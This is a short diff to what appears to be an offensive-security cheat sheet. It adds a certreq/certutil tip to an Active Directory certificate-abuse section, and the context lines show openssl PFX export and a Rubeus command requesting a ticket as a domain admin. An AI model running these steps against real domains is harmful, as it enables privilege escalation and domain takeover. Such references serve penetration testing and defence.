@@ -2469,6 +2469,7 @@ Exploitation:
     ```ps1
     openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
     ```
+* Use ```certreq``` and ```certutil``` to request a certificate and convert to a PFX (https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee)
 * Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus
     ```ps1
     Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
